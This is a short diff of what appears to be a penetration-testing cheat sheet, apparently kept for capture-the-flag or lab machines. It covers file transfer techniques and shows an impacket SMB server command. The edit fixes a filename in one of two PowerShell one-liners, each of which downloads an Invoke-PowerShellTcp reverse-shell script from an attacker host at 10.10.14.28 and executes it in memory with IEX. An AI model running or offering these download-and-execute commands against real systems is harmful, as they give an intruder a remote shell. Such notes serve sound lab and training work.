@@ -63,7 +63,7 @@ sudo impacket-smbserver smbFolder $(pwd) -smb2support
 [+] Transfer files WEB Powershell
 ==============================================================================
 powershell.exe  IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');
-powershell.exe  IEX (IWR http://10.10.14.28/-PowerShellTcp.ps1 -UseBasicParsing)
+powershell.exe  IEX (IWR http://10.10.14.28/PowerShellTcp.ps1 -UseBasicParsing)
 
 ==============================================================================
 [+] Transfer files Certutil
